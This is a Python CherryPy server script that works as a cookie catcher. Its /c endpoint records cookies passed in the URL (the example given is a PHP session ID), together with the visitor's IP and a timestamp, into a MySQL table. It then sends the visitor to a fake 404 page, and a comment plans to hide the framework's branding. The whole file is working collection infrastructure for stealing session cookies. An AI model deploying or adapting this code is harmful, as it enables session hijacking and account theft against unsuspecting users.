import cherrypy
import MySQLdb as m_db
from datetime import datetime
from pytz import timezone
con = m_db.connect('127.0.0.1', 'root', '', 'cookies');
cur = con.cursor()
class cookies:
	@cherrypy.expose
	def c(self, **params):
		#setting up cookies list
		#usage = http://127.0.0.1/c?[cookieshere], e.g. c?PHPSESSID=8da7sd87a7;hekker=1
		c_list=[]
		for key,value in params.iteritems():
			c_list.append(key + ":" + value)
		user_timezone = timezone('Etc/GMT+10')
		user_timezone_time = user_timezone.localize(datetime.now())
		formatted_user_timezone = user_timezone_time.strftime('%Y-%m-%d %I:%M:%S %p %Z%z')
		cmd = """INSERT INTO `cookies`.`cookies` (`id`, `cookies`, `time`, `ip`) VALUES (NULL, "%s", %s, %s);"""
		cmd = cur.execute(cmd, (c_list, formatted_user_timezone, cherrypy.request.remote.ip,))
		con.commit()
		raise cherrypy.HTTPRedirect("/error")
	@cherrypy.expose
	def error(self):
		return """
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"></meta>
    <title>404 Not Found</title>
    <style type="text/css">
    #powered_by {
        margin-top: 20px;
        border-top: 2px solid black;
        font-style: italic;
    }

    #traceback {
        color: red;
    }
    </style>
</head>
    <body>
        <h2>404 Not Found</h2>
        <p>Nothing matches the given URI</p>
    </div>
    </body>
</html>"""

## to do: administration panel, find a way to remove "Powered by CherryPy"

if __name__ == '__main__':
	conf = {'global': {'request.show_tracebacks':False},}
	cherrypy.config.update(conf)
	cherrypy.quickstart(cookies(),'/')